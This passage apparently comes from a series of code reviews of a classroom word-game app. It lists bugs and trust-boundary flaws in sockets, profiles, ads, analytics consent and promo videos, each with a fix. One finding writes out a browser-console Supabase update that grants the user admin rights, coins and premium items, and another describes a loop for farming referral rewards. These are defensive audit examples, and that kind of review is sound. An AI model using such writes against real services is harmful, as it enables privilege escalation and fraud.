4. If B's fetch fails, `setError(true)` keeps A's lessons in place, now next to an error.
5. The effect is keyed on `ready`, not on `user.id`. If the account switch never passes through a non-ready render, B's lessons may never be fetched at all.

**Fix:** Key the effect on `user?.id`. Call `setLessons(null)` and `setError(false)` when the user id changes or `ready` turns false.

## 8. Achievement counters undercount, and are client-forgeable if the unlocks are persisted
**Severity:** Low as a counting bug. Higher if the unlocks are written to the database.

**Where:** `PracticeSessionProvider.tsx:283-299,348-367`, with the source at `:154-161`.

**Failure scenario:**
1. A student finishes two perfect flashcard rounds without remounting the provider.
2. On each round, `newPerfectGames = perfectGames + 1`, where `perfectGames` is the value read at mount. It is written to localStorage but never fed back into state.
3. Both rounds therefore store the same number, and the "perfect games" badge stalls. `morningPractices` has the same problem.
4. More importantly, `checkForUnlocks` is given numbers built entirely from localStorage, which the student controls.
5. If `useAchievementUnlock` writes those unlocks to the database, any student can edit localStorage to unlock every badge, and any XP or coin rewards attached to them.

**Fix:**
- Have `useAchievementTracking` expose increment functions that update both state and storage.
- Make the server recompute achievement eligibility from its own `practice_sessions` data, and never trust client-supplied counts.

---

## Checked and found fine
- `teacherBarInset`, `TeacherLiveControls` and its layout-effect cleanup.
- `ProjectorBoard`, and `ProjectorWheel`'s re-request on `startGame`.
- `useLegacyClassroomRedirect`.
- `ProjectorBossStage`: all hooks run before the `view` early return.
- `ClassroomBossPicker`'s self-correcting effect: it doesn't loop.
- The `TeacherOnboarding` portal: it only opens after a client-side click.
- `TeacherProCheckoutCta` copy interpolation.
- Rendering in `OpponentProgressBar`, `ClassroomBoardMoment`, `ClassroomLobbyShell` and `LandingProofStrip`.

**Order to work in:** check #1 first. It takes 5 minutes in a private window and decides whether anyone can pay you at all. Then fix #2 and #3, which are both small diffs.

## Shard 12

# Senior review: classroom launch, projector and miss-gap paths

This pass reviewed the files attached here: the lobby hooks, the projector, miss-gap and results delivery. It skips everything the previous pass already reported, including these items:

- the async-init socket leak and `t` in the deps
- the spell-tile double-tap
- the ignored `.error` in `useTeacherLobbyData`
- the live panel not resetting
- the mode-switch timeout
- the reveal-gate timer and `revealedEarly`
- the anonymous miss-gap roster
- the server-side `setex` overwrite

Where a finding depends on server code I couldn't see, it says **unverified**. Findings are ordered by severity.

---

## 1. The live classroom path uses the typed display name as each player's identity
**Where:**
- `components/multiplayer/ClassroomJoinNamePrompt.tsx:43-54`: free text, max 20 characters, validated only on the client.
- `components/education/projector/ProjectorRoster.tsx:44, 161, 168`: the ready set and React keys use `username`.
- `components/education/results/ClassroomSessionStandings.tsx:7-15, 58, 102`: round scores and the before-round order are keyed by `username`.

**Failure scenario:**
1. Two students both type "Daniel". The projector renders two `<m.li key="Daniel">`, and `AnimatePresence` drops or duplicates one of them. When one Daniel taps Ready, both chips light up, because `readySet.has('Daniel')` matches both.
2. `standingsBeforeRound` reads `roundScores['Daniel']`. The two students' session totals are merged, or one overwrites the other. The "who won today" table is then wrong in front of the class.
3. Worse case, if the server reclaims a seat by name (the reconnect pattern). Alice's phone drops at the round boundary, which the delivery-gate comment calls "the single commonest thing that happens in a classroom". Bob opens the name prompt, types "Alice", and takes over her seat and score. If the server maps seat to userId for persistence, he may also take her XP.

**Severity:**
- High if the server keys seats by name or reclaims them by name (**unverified**).
- Medium otherwise, because the projector and standings are still wrong whenever names collide.

**Fix:**
- Have the server issue a `playerId` bound to the verified auth uid. Anonymous guests already get one through `/classroom/join`.
- Key the roster, ready set, round scores and standings by `playerId`. Use `username` for display only.
- On the server, reject or suffix duplicate display names within a room.
- Never allow a seat to be reclaimed by name alone.

## 2. A launch has no failure path for a socket that never connects, so the teacher's spinner can spin forever
**Where:** `components/education/lobby/useClassroomLaunchSocket.ts:105-108` (no `connect_error` listener), `:194` and `:218` (emit with no ack timeout).

**Failure scenario:**
1. School Wi-Fi blocks websockets, or the server is down, or the handshake is refused.
   - The comment at `:102` says "the server will refuse out loud". A refused handshake actually arrives client-side as `connect_error`, and nothing here listens for it.
2. `launch()` sets `isStarting=true` and emits `createClassroomGame`.
   - socket.io buffers the emit while disconnected.
   - None of `classroomGameCreated`, `classroomGameError` or `rateLimited` ever arrives.
3. The teacher is stuck on "starting" in front of the class. Unlike the pressure write (`:134`), this hook has no watchdog.
4. If connectivity returns minutes later while the lobby is still mounted, the buffered create fires late. That can open a room after the teacher has moved to another flow.

**Severity:** Medium-High. It is teacher-facing, happens live in class, and gives no way out except a reload.

**Fix:**
- Send the create with an ack timeout: `socket.timeout(15_000).emit('createClassroomGame', payload, (err, res) => …)`. Alternatively, start a 15–20 s watchdog in `launch()` that sets `startError` and clears `isStarting`.
- Handle `connect_error`:
  - On an auth error, fail immediately.
  - On a transport error, leave the watchdog to decide.
- On a watchdog fail, discard the buffered emit (`socket.sendBuffer = []`).

## 3. `classroomGameError` and `rateLimited` are not tied to any request, so post-create errors read as "start failed" and a retry wipes the room
**Where:** `useClassroomLaunchSocket.ts:160-187`, with `:76` (the `gameCode` is fixed for the hook's lifetime).

**Failure scenario:**
1. The room is created and `roomCreatedGameCode` is set. The follow-up `updateClassroomGamePressure` is then rejected with any message other than the exact string `'education.classroomGame.pressureFailed'`. Examples are a Zod "Invalid payload: …" (the comment at `:157` says server errors look like this), an auth refusal, or a Pro-gate refusal.
2. `:177-179` then shows "start failed", sets `startError` and clears `isStarting`. Five seconds later the pressure watchdog adds a second toast. The same thing happens for a `rateLimited` triggered by any other emit on this socket.
3. The teacher believes the launch failed and retries.
   - `launch()` re-emits `createClassroomGame` with the same `gameCode`.
   - The server's `setex` (previous pass, shard 5 #2) overwrites the room the teacher just created.
   - Students who already scanned the code lose their seats.
   - The retry part assumes the lobby offers a retry button when `startError` is set (**unverified**).

**Severity:** Medium.

**Fix:**
- Add a `requestId` (or an `op`) to every client emit, and have the server echo it in `classroomGameError` and `rateLimited`. Only treat an error as a start failure when it matches the pending create.
- Once `roomCreatedGameCode` is set, never route an error to `startError`.
- Make `launch()` a no-op after a successful create.

## 4. The client controls trust-sensitive fields in the create payload, and Pro features are gated only in the browser
**Where:** `useClassroomLaunchSocket.ts:28-61` and `:213-216`:
- `teacherId` and `teacherName` (`:31-32`)
- `lessonNames` and `vocabularyWords` (`:34-35`)
- `classroomBossId` (`:50`)
- `pressure`, documented as "Absent for a free teacher" (`:54-60`)

**Failure scenario:**
1. A free teacher opens devtools and calls `socket.emit('updateClassroomGamePressure', …)`, or sets a Pro `classroomBossId`. That gets Pro pressure dials or a Pro boss without paying, unless the create and pressure handlers check entitlement. The previous pass noted that the boss picker downgrades only on the client. Pressure was not checked.
2. `vocabularyWords` is a client array with no visible cap.
   - A 20k-word paste becomes part of the Redis room record.
   - Per the previous pass, the full record is sent to every class member on `getActiveClassroomGames`.
   - At 10x scale, that fan-out is a bandwidth and memory problem.
3. If the server uses `payload.teacherId` rather than the verified socket uid anywhere, ownership can be spoofed.

**Severity:** Medium, for revenue leakage and 10x cost. **Unverified** on the server side.

**Fix:**
- On the server, derive `teacherId` from `socket.data.verifiedUserId`.
- Load words and names from `lessonIds`, with an ownership check.
- Check Pro entitlement in both the create handler and the pressure handler.
- Add Zod caps: for example `vocabularyWords.max(500)` and `lessonIds.max(20)`, with a string max length on each item.

## 5. Projector listeners bind to whichever shared socket exists at mount
**Where:**
- `components/education/projector/ProjectorQuizBlocked.tsx:18-30`: the effect deps are `[gameCode, t]`, and the socket is read once inside the effect.
- `ProjectorQuizBlocked.tsx:46` and `ProjectorLobby.tsx:305`: both pass `getSharedSocketIfExists()`, which is a plain getter called at render time and is not reactive.

**Failure scenario:**
1. `ProjectorLobby` mounts before the shared socket exists. Alternatively, `SocketContext` later replaces the socket instance, for example on an auth refresh or a manual reconnect.
2. `useQuizStartRefused` never attaches, or stays attached to the dead instance.
3. The teacher taps "Start quiz" for a list with no quiz words. The server emits `startRefused`, and nobody hears it. There is no toast, `quizBlocked` stays false, and the Start control can stay on "creating…".
4. The "play classic instead" path in `ProjectorQuizBlocked` has the same problem. It holds a null or stale socket until something happens to re-render the component.

**Severity:** Medium. This is a silent no-op during a live class.

**Fix:** Subscribe through a hook that re-subscribes when the socket instance changes, such as a `useSocketEvent` that reads the socket from context state. Pass the socket down from that context rather than calling the getter at render time.

## 6. A miss-gap assignment is identified by `(classKey, dueDate)`, and the due date is editable
**Where:**
- `components/education/missGap/useMissGapProgress.ts:42-48, 86`: progress is queried by `classKey` plus `dueDate`. The comment confirms the server narrows by "due key".
- `MissGapTeacherCompose.tsx:63-77, 87-92`: the due date can be edited after sharing, and `shareState` never resets.

**Failure scenario:**
1. A teacher shares homework due Monday. Students start playing.
2. The teacher changes the date to Tuesday and re-shares.
   - The button still says "Copied", because `shareState` is never reset.
   - The progress card now queries the Tuesday key and shows 0 players. The Monday runs look as if they vanished.
   - Students on the old link keep posting to the Monday key.
3. The reverse also happens. Two different homework sets for the same class with the same due date merge into one board, so averages and streaks mix assignments.

**Severity:** Medium. This is a data-integrity problem in a teacher-facing report.

**Fix:**
- Mint an `assignmentId` when the teacher shares. Use either a server-created row or a hash of `classKey`, the word list and the creation timestamp.
- Put the id in the share URL and key progress by it. Keep `dueDate` only as an attribute, which drives the on-time/late label.
- Reset `shareState` whenever the payload changes.

## 7. The projector trusts the teacher's sessionStorage over the server record for room mode
**Where:** `components/education/projector/ProjectorLobby.tsx:112-130`. `classroomGameMode` (from `lessonGameData`) and `readLocalQuizVariant()` / `readLocalBossId()` take priority over `liveGame.*`. `quizPlayable` is read once, at `:129`. Also `useClassroomModeSwitch.ts:57`: `writeLocalGameMode` silently no-ops when `lessonGameData` is absent.

**Failure scenario:**
1. The server's record differs from the teacher's local intent. This happens when:
   - it reconciles the launch, for example downgrading a Pro boss for a free teacher or adjusting the language, or
   - the mode was switched from a second window or device.
2. The projector shows the local mode. The Start label reads "START QUIZ" for a board room.
3. `isQuiz` controls `quizBlocked`. A stale local "quiz" with `quizPlayable === false` disables Start for a room the server would start fine.
4. Meanwhile the host's `startGame` sends `hostSelectedGameMode` from the store, which comes from the broadcast. The label, the gating and the actual round can therefore all disagree.

**Severity:** Medium.

**Fix:** Once `useLiveClassroomGameInfo` resolves, treat the server record as the source of truth. Use sessionStorage only as a placeholder before that load. Recompute `quizPlayable` from the server on every mode change.

## 8. The socket handshake token is captured once and goes stale on reconnect
**Where:** `useClassroomLaunchSocket.ts:94-108` (`auth: token ? { token } : {}`).

**Failure scenario:**
1. A teacher opens the lobby before class. The Supabase access token expires about an hour later.
2. A Wi-Fi blip triggers socket.io's automatic reconnect. It reuses the same `auth` object, which still holds the expired JWT.
3. The server either rejects the handshake, which leads straight into finding 2's infinite spinner, or treats the socket as unverified.
   - Per the previous pass, the server then reads the handshake `authUserId` fallback. This client doesn't send one.
   - The teacher gates then fail with "start failed" for a legitimate teacher.

**Severity:** Medium.

**Fix:** Use socket.io's function form so a fresh token is fetched on every (re)connect:
```ts
auth: async (cb) => {
  const { data } = await createClient().auth.getSession();
  cb({ token: data.session?.access_token });
}
```
Other socket hooks probably use the same pattern, so check `useActiveClassroomGame` too.

## 9. Room codes are minted by the client with `Math.random`, and collisions become routine at 10x
**Where:** `useClassroomLaunchSocket.ts:64-69, 76`.

**Failure scenario:**
1. The codespace is 32^6, about 1.07 billion. Occupied codes are live rooms plus ended records still within their TTL.
2. With the server overwriting on create (previous pass), any accidental collision silently takes over another teacher's live room.
3. At around 25k creates a day with a few hours of TTL, that is roughly one takeover every week or two. The rate grows with the square of the scale: at 10x, expect several a day. They will show up as "my class got kicked out" tickets that you cannot reproduce.

**Severity:** Low today, Medium at the next 10x.

**Fix:** Let the server mint the code. Use `SET NX`, retry on collision, and return the code in the ack. The client already handles this, because it navigates with `data.gameCode || gameCode` (`:145`). Display a code only after the ack.

## 10. Miss-gap answers have no local "answered" latch, so extra taps can be reported after the round is scored
**Where:** `components/education/missGap/MissGapRoundView.tsx:81` (`locked` comes only from the `outcome` prop), `:96-102`, and `:237-240`.

**Failure scenario:**
1. **Meaning round.** A student double-taps a choice. A fast thumb can also hit a second tile. Both clicks run before the parent re-renders with `outcome`, so `onAnswer` fires twice. That second call can be a different answer.
2. **Spell round.** The student completes the word, and `onAnswer(true)` runs at `:97`. One more tap lands before `locked` arrives. `attempt` is now longer than `target`, so `:100-101` calls `onAnswer(false, …)` for a correctly spelled word.
3. Whether this corrupts the teacher's accuracy, stars and streak depends on the shell ignoring a second answer (**unverified**). The previous pass's fix, the `includes` guard, does not cover either path.

**Severity:** Low-Medium. It affects the integrity of the homework report.

**Fix:** Add an `answeredRef` that resets on `round.id`. Set it before the first `onAnswer` call, and return early from `pickTile` and the choice `onClick` when it is already set.

---

**What I'd do first:**
1. Findings 2, 3 and 8 together, as one socket-hardening change in the launch hook covering the ack timeout, request correlation and the auth function. That removes the "stuck in front of the class" failures.
2. Confirm the server behaviour behind findings 1 and 4. They cover identity and entitlement, the only two here that can cost you money or a school's trust.

## Shard 13

# Senior review: what the previous pass missed

The previous pass audited each file in isolation, so it reported many UI races and copy issues. It missed the places where the browser is trusted with values the server should own. This slice includes the profile, ads, practice, native and projector code. Several of its call sites expose that trust boundary even though the server half isn't in the slice.

I've marked each finding **verify** where it depends on code I couldn't see. Findings 1 and 2 are the ones I'd check today. Each takes about 10 minutes and could be critical.

## 1. Profile updates are a client-side `Partial<ProfileData>` write, which risks mass assignment of coins, XP, admin and premium parts. Critical if RLS is row-only (verify)

**Where:**
- `fe-next/components/profile/ProfileHeader.tsx:43` declares `updateProfile(updates: Partial<ProfileData>)`.
- The call sites are `:90-93`, `:111`, `:130` and `:143`.

**Why it's plausible:**
- The function takes any subset of `ProfileData` and returns `{data, error}`, which is the shape of a direct `supabase.from('profiles').update()` call.
- `ProfileData` includes sensitive columns:
  - `total_coins` (`ProfileCoinsSection.tsx:73`)
  - `total_xp` and `prestige_level` (`ProfileXpSection.tsx:29,32`)
  - `ranked_mmr` (`ProfileRankedProgress.tsx:61`)
  - `achievement_counts`
- Earlier shards show that `profiles.is_admin` gates admin pages (shards 26 and 27) and that `profiles.premium_avatar_parts` holds granted cosmetics (shard 5).

**Failure scenario:**
1. A signed-in user, including an anonymous classroom guest, opens devtools.
2. They run `supabase.from('profiles').update({ is_admin: true, total_coins: 1e9, premium_avatar_parts: [...] }).eq('id', me)`.
3. If the RLS policy is only `USING (auth.uid() = id)` with no column restriction, the write succeeds.
4. The attacker now passes the admin gate, has unlimited currency and owns every cosmetic.
5. With admin access they can reach the Teacher Pro grant panel, which hands out free Pro.

**Same root cause, smaller version:**
- `avatar_config` (`:130`) is saved as-is. Locked premium parts are enforced only in the builder UI.
- Onboarding opens the builder with `premium={null}` (`QuickProfileSetup.tsx:237`), which may not enforce locks at all.
- The `display_name` 2–20 character rule (`:101-108`) is checked only in the client. That name appears on projectors in front of classes.

**Fix:**
- Run `REVOKE UPDATE ON profiles FROM authenticated`.
- Then run `GRANT UPDATE (display_name, avatar_config, country_code) ON profiles TO authenticated`.
- Add a `BEFORE UPDATE` trigger that rejects any change to economy, admin or rank columns unless the role is `service_role`.
- Validate the parts in `avatar_config` against owned and level-unlocked parts on the server, either in a trigger or an RPC.
- Add a `CHECK` constraint on the `display_name` length.

**Verify:** run `select * from information_schema.column_privileges where table_name='profiles'` and read the `profiles` policies.

## 2. The rewarded-ad and offerwall reward amount and daily cap live in the client. High if the server trusts them (verify)

**Where:**
- `fe-next/components/profile/ProfileCoinsSection.tsx:117` sets `goldAmount={20}`.
- The comment at `:114-116` says the button "self-hides when … the daily cap is hit".
- The offerwall button is at `:120`.

**Failure scenario:**
1. The reward size is a prop and the cap is a visibility rule, so both are client-side.
2. If the grant endpoint accepts an "ad completed" call from the browser, a script can call it repeatedly. If it also accepts an amount, the script can choose that too.
3. The result is unlimited coins. Advertisers also see fraud on your ad account, which can get it banned. Ads are your nearest revenue line.

**Fix:**
- Grant coins only from AdMob server-side verification (SSV) callbacks, or from offerwall postbacks verified with an HMAC.
- Set the amount on the server.
- Make the grant idempotent with a unique `transaction_id`.
- Enforce the daily cap per user in SQL.

## 3. Practice scores are computed in the client and are not validated. Medium: affects the integrity of XP and the paid analytics

**Where:**
- `fe-next/components/practice/WarmupRound.tsx:142-163` and `:178-185`.
- `fe-next/components/practice/ProducePractice.tsx:153-158` and `:182-190`.

**Failure scenario:**
1. In Warmup, every string the grid submits earns `length*10` points. Nothing in this file checks that it is a real word.
2. The client-side `score`, `wordsFound` and `vocabularyWordsFound` values are passed to `onComplete`.
3. In Produce, `correct`, `accuracy` and `points` are tallied in the browser.
4. If the caller sends these to session completion, a student can forge them by tracing junk or editing the payload. That inflates XP.
5. It also corrupts the teacher accuracy reports that Teacher Pro sells.

**Also:**
- `handleWordSubmit` checks a stale `foundWords` closure (`:147`).
- If two submit events fire before a re-render, the same word is scored twice.

**Fix:**
- Have the client send raw attempts. For Warmup that is the board seed plus the words; the board is deterministic per seed (`:97-106`), so the server can regenerate it. For Produce that is the question id plus the typed answer.
- The server then validates against the dictionary and the board, and recomputes the score.
- In the client, dedupe inside a functional `setFoundWords`.

## 4. The native app reconnects its socket on foreground with a possibly expired token. Medium (verify)

**Where:** `fe-next/components/native/NativeAppProvider.tsx:84-88`.

**Failure scenario:**
1. A teacher's tablet sits in the background for more than an hour, so the Supabase JWT expires.
2. On resume, `socket.connect()` replays the original `handshake.auth`.
3. The server's token check fails. Shard 5 found that `classroomSocketAuth` then falls back to the client-supplied `authUserId`.
4. One of two things follows. The teacher loses host controls mid-lesson. Or the unverified fallback quietly carries the session, which makes that fallback load-bearing so it can't be removed safely.

**Fix:**
- Before `connect()`, call `await supabase.auth.getSession()`, which refreshes the token, and set `socket.auth`.
- A cleaner option is to configure socket.io with `auth: (cb) => getSession().then(s => cb({ token: s.access_token }))`, so every reconnect fetches a fresh token.
- On a `connect_error` caused by auth, refresh once and retry.

## 5. Referral XP can be farmed using unthrottled anonymous accounts. Low–medium (verify)

**Where:**
- `fe-next/components/profile/ReferralCard.tsx:315-325` advertises "+100 XP" when a friend joins.
- Shard 4 found that the classroom join route mints anonymous users with no rate limit.

**Failure scenario:**
1. A script opens the referral link, then calls `signInAnonymously()`, in a loop.
2. Each new account counts as a join and pays the referrer XP.
3. XP drives level.
4. Level unlocks avatar parts (`ProfileHeader.tsx:161-163`) and prestige.

**Fix:**
- Reward only referrals from non-anonymous, verified accounts.
- Require a minimum number of games recorded on the server before paying.
- Cap rewards per referrer per day.

## 6. The projector ticker bypasses the teacher's "hide leaderboard" setting, and rows are keyed by username. Low–medium

**Where:** `fe-next/components/multiplayer/wordcraft/WordcraftProjectorView.tsx`.
- The ticker at `:217-248` shows student names and scores.
- The standings at `:193` and the targets at `:159` use names and words as React keys.

**Failure scenario:**
1. A teacher picks `hidden` or `top3` pressure for an anxious class, which is a setting about the privacy of minors.
2. The standings panel obeys the setting.
3. The ticker still shows "Noa built X +40 · BINGO" for every student on the class screen, so the class can tally who is winning.
4. Separately, two students who join as "Noa" get the same React key. One row can vanish or show the other's score on the projector.

**Fix:**
- When `leaderboardHidden` is set, anonymise the ticker or drop scores from it. In `top3` mode, hide names in the ticker too.
- Key standings by player id; add the id to the leaderboard payload.

## 7. A backend module is imported into client code. Low: a boundary problem waiting to happen

**Where:** `fe-next/components/profile/ProfileHeader.tsx:22` is a runtime import of `getXpProgress` from `@/backend/modules/xpManager` inside `'use client'`.

Shard 9 flagged `XpProgressBar` for the same thing as unverified. This is a second, confirmed runtime import, so the pattern is spreading.

**Failure scenario:** the day someone adds a Supabase admin client or an environment secret to `xpManager`, one of two things happens:
- the build breaks, or
- the secret ships to every browser.

**Fix:**
- Move the pure level maths to `shared/`.
- Add `import 'server-only'` to the `backend/modules/*` files.
- Add an ESLint `no-restricted-imports` rule that bans `@/backend/**` under `components/` and `app/**/PageClient.tsx`.

## Checked, not flagged

- **`MpRoomCode`:** showing "copied" even when the clipboard is blocked is intentional, per the comment in the code.
- **`MpRosterStrip`:** the overflow and "always keep me visible" logic is correct.
- **`PushNotificationPrompt`:** the quiet-zone and one-shot-flag ordering is correct. Its false-grant analytics issue was already reported.
- **`LevelRing`:** the `colorHex` value comes from style presets, not user input.
- **Wordcraft `projectorState` pull:** it returns only the lesson targets, which are already shown on the screen.

**Order of work:** check finding 1, the profile column privileges, first. If it's open, it undercuts the admin gate, the coin economy and the premium cosmetics all at once.

## Shard 14

# Senior review: profile showcase and promo compositions

## Scope

This batch has two parts:

- **Profile showcase:** `ShowcaseStage`, `StageBackdrop`, `StageStatTile`, `profileShowcaseModel`, and two hooks.
- **Promo compositions:** five Remotion videos (Blast, Survival in English, and three Reddit cuts).

Shard 12 marked the showcase model and `useShareProfile` clean. Shard 13 reviewed only the Hebrew, Wordle→LexiClash and Word Hunt promos. The English Survival, Blast and Reddit videos were never reviewed.

Most review categories don't apply here. There are no secrets, no SQL or HTML injection paths, no concurrency, and no server-side failure handling. Everything listed is either a trust-boundary question (findings 1 and 2) or a claim that ships to an audience likely to check it (findings 3 to 7).

---

## 1. Public profile "rarity" status is derived only from stored config (unverified, medium if cosmetics are earned or sold)

**Where:** `components/profile/showcase/ShowcaseStage.tsx:148-149, 188-190`, and `profileShowcaseModel.ts:73-88`

**Failure scenario:**
1. The stage picks its theme (flames backdrop, 4 crest stars, "Legendary" chip) from `getConfigRarity(config)` and `getRarestEquipped(config)`.
2. It draws the frame from `frameId`.
3. Nothing in this path checks that the viewer's subject actually owns those parts or that frame.
4. If the profile owner can write their own `custom_avatar` or frame column through the browser Supabase client, the showcase becomes unearned status. The common pattern is an RLS policy like "users can update their own profile row".
5. In that case a user sets `accessory: '<legendary id>'` and `frameId: 'frame-gold'`. Their `/u/[username]` page then shows full legendary flames.
6. That devalues every earned, and eventually paid, cosmetic.
7. Shard 5 already found that `premium_avatar_parts` sits on `profiles` and is written with read-modify-write. If that column is user-writable too, ownership itself is forgeable.

**Fix:**
- Confirm the avatar and frame write goes through a server route or RPC that checks each part against `premium_avatar_parts` and the level ladder.
- Revoke direct client `UPDATE` on those columns.
- As defence in depth, have the public-profile loader drop any equipped part the user doesn't own before passing `config` and `frameId` to the stage.

## 2. `frameId` is interpolated into `className`, allowing class injection on other people's screens (low to medium)

**Where:** `ShowcaseStage.tsx:188`, `` `avatar-${frameId}` ``. Also check `ringColorHex` at `:166`.

**Failure scenario:**
1. `frameId` comes from the profile row.
2. A value with spaces becomes several classes. For example, `frame-gold fixed inset-0 z-50` renders as `avatar-frame-gold fixed inset-0 z-50`.
3. Any utility already compiled into the CSS bundle applies. `fixed`, `inset-0`, `z-50`, `hidden` and `opacity-0` all exist.
4. The avatar circle can become a full-viewport overlay on that user's public profile. It covers the page, including any report or block controls, for every visitor.
5. `cn()` and tailwind-merge do not sanitise this.
6. `ringColorHex` is the same kind of untrusted value flowing into a style. I can't see `LevelRing`, so I can't say whether it's validated.

**Fix:**
- Map through an allowlist, for example `const FRAME_CLASS = { 'frame-gold': 'avatar-frame-gold', … } as const`, and render nothing for unknown ids.
- Validate `ringColorHex` against `/^#[0-9a-f]{6}$/i`.
- Enforce both on write as well (see finding 1).

## 3. Survival promo tells Wordle players that Wordle gives one guess (medium, business)

**Where:** `components/promo/SurvivalPromoVideo.tsx:358` ("One guess... then wait 24 hours?") and `:1399` ("Wordle ends after one guess.")

**Failure scenario:**
1. This Reel targets Wordle players, per the header at `:4`.
2. Every one of them knows Wordle gives six guesses.
3. The scene even draws the six rows itself (`:316-339`, one typed row plus five empty).
4. The ad's central claim is visibly false to its exact audience. That hurts click-through and invites "this is wrong" comments that boost the wrong signal.
5. Shard 34 flagged a similar Wordle error in a blog post. This one is in paid or organic ad creative.

**Fix:** Reframe around the real gap: "Six guesses… then wait 24 hours?" and "Wordle ends after one puzzle."

## 4. Survival promo's puzzle contradicts its own clues (low)

**Where:** `SurvivalPromoVideo.tsx:571` and `:851` against `:828` and `:1103`. Also `:552` against `:582-588` and `:595-597`.

**Failure scenario:**
1. The clue row marks R at index 3 as `'present'`. That means R is in the word but not at that position.
2. The answer revealed is SHARK, which has R at index 3. The tile should be `'correct'`.
3. "ARCHER" is listed as found, but the highlighted row 3 spells `A R C H W`. No R is adjacent to the E at (4,3), so ARCHER can't be traced anywhere on the grid.
4. Viewers who pause the video will see both errors.

**Fix:**
- Set index 3 to `'correct'`, or move R to a position SHARK doesn't use.
- Replace ARCHER with a word on the grid. SHALE and STORM are already traceable.

## 5. Blast promo's "found" words aren't on its grid (low)

**Where:** `components/promo/BlastPromoVideo.tsx:481` and `:499`, against the grid at `:468-473`

**Failure scenario:**
1. The BLAST path ends on (1,3), which is E, so it spells BLASE. The code comment admits this ("wait → T").
2. The only T is at (1,1), which is not adjacent to S at (0,3). BLAST is not traceable.
3. The WRIST path jumps from I(2,2) to S(0,3) to T(1,1). Neither step is adjacent.

**Fix:** Change the grid so the paths are legal. For example, make row 1 `O T R E` → `T O R E` and re-derive both paths. Alternatively, pick words the current grid supports.

## 6. Reddit gameplay and VS videos highlight impossible paths, and the VS score doesn't add up (low, but posted to scrutinising subs)

**Where:**
- `RedditGameplayDemo.tsx:59-60`, against the grid at `:44-49`
- `RedditVSBattle.tsx:177-185` and `:443`

**Failure scenario:**
1. In the gameplay demo, CLASH lights C-L-A-S and then T(0,3). H is at (0,0), not adjacent to S, so CLASH is untraceable.
2. WORDS lights T(0,3) as its S, which also jumps two rows. The real S at (1,3) is right next to D.
3. r/WebGames and r/playmygame viewers frame-step videos.
4. In the VS battle, CLAWS (no W adjacent to A) and DIAL (A is not adjacent to I) are also untraceable.
5. The victory card says "WordNinja42 — 980 pts", but `PLAYER_WORDS` sums to 650.

**Fix:**
- Change the WORDS path to end at `[1,3]`.
- Replace CLASH, CLAWS and DIAL with traceable words, or edit the grid.
- Derive the victory score from `scoreAt(PLAYER_WORDS, Infinity)`.

## 7. Multilingual showcase says "6 languages" but shows 5, and two words are untraceable (low)

**Where:** `RedditMultilingualShowcase.tsx:446` against `LANGUAGES` at `:61-107`. Also the Hebrew grid at `:74-75` and the Spanish grid at `:101-102`.

**Failure scenario:**
1. The CTA flag row and scenes cover only EN, HE, JA, SV and ES. Russian is missing, while the subtitle claims six.
2. On the Hebrew grid, the final ה in מלחמה must be next to מ(0,3), and it isn't.
3. PALABRA needs a B next to an A, and B(1,0) has no such neighbour.
4. These are the language-learner subs, where native speakers will check.

**Fix:**
- Add a Russian scene and flag, or change the subtitle to five.
- Pick words that trace on each grid.

## 8. `?from=` telemetry accepts any attacker-chosen source and lies about its type (low; grows with scale)

**Where:** `profileShowcaseModel.ts:143-149`, with the call site at `useProfileViewTracking.ts:25`

**Failure scenario:**
1. Any string matching `^[a-z][a-z0-9_]{0,31}$` is returned and cast to `ProfileViewSource`.
2. Anyone sharing `/u/x?from=anything` writes a new source value into `profile_viewed`.
3. As shares grow, the source breakdown fills with junk, so share-loop attribution becomes unreliable.
4. Any downstream `switch` over the union silently gets values it doesn't handle.

**Fix:** Check `raw` against the actual `ProfileViewSource` list, for example `KNOWN_SOURCES.includes(raw)`. Map unknown values to `'other'`, not passthrough.

---

## Considered and not listed

- **`useShareProfile.ts:25-32`:** it uses context `language` instead of the URL locale, and has no fallback when native share fails for a reason other than cancel. I can't see `useNativeShare`, so this is unconfirmed and low impact.
- **`getHeadlineStats`:** if `winRate` were a 0–1 fraction it would render "0.45%". I can't see the source, so I didn't flag it.
- **`StageBackdrop` and the remaining showcase rendering:** these are pure decoration with constant inputs. `GearChip`'s inline `background` comes from the constant unlock ladder, so it is safe.

**Priority:** fix 1 and 2 first, because they are the only items here with a real trust boundary. Then fix 3 before the Survival Reel runs again.

## Shard 15

# Senior review: what the previous pass missed

## Scope

Of the files supplied in full, the promo videos were already covered in Shard 13. `PostHogProvider.tsx` and `LogRocketIdentify.tsx` were not reviewed by any shard. They are where the new findings are. Analytics is a trust boundary here: it is the main path by which student and teacher data leaves your infrastructure for a third party.

I found 4 real issues and I'm not padding to 10. I did not have `lib/analytics/lazyPosthog.ts`, `hooks/useLogRocketIdentify.ts`, `utils/cookieConsent` or your PostHog project settings. Anything that depends on them is marked **inferred** or **verify**.

---

## 1. "Reject analytics" does not stop events being sent, and neither does ignoring the banner
**`fe-next/components/providers/PostHogProvider.tsx:47-48, 72-74, 158-160`** · **Severity: medium-high (compliance and trust)**

**Failure scenario:**
1. A visitor, possibly a student, lands on the site and ignores the consent banner.
2. The `loaded` callback sees `get_explicit_consent_status() === 'pending'` and calls `ph.opt_out_capturing()` (`:72-74`).
3. With `cookieless_mode: 'on_reject'` (`:48`), `opt_out_capturing()` switches PostHog into cookieless capture. It does not stop capture. The code comment at `:73` says this is intended: it exists so that undecided visitors still emit events.
4. A visitor who explicitly clicks Reject reaches the same state through `onConsentChange`, which calls `posthog.opt_out_capturing()` (`:159-160`).
5. In both cases, pageviews, pageleaves, autocaptured clicks and exceptions (`capture_exceptions: true`) are still sent to PostHog EU, with IP and full URL.
6. The file header (`:8`) says "Opts in only when analytics consent is granted", and line 47 says "GDPR". The code does the opposite of the header.

**Why it matters for you:**
- Your education pages claim FERPA compliance (Shard 1 #5).
- AdSense and school procurement reviews check exactly this.
- "We respect your cookie choice, but still track you" is the sort of thing a district DPA review catches.
- **Cost at 10x:** every rejecting or undecided visitor is a billable PostHog event, so as traffic grows you pay to track people who said no.

**Fix:** decide the policy explicitly.
- **If no consent should mean no tracking:**
  - Remove `cookieless_mode: 'on_reject'`.
  - Delete the `pending → opt_out_capturing()` branch.
  - Keep `opt_out_capturing_by_default: true`.
- **If cookieless-on-reject is a deliberate legal position:**
  - Rewrite the header and the privacy policy to say so.
  - At minimum, disable capture on `/student`, `/education/live` and classroom routes.

---

## 2. Full URLs, element text and possibly session replays go to PostHog unsanitised
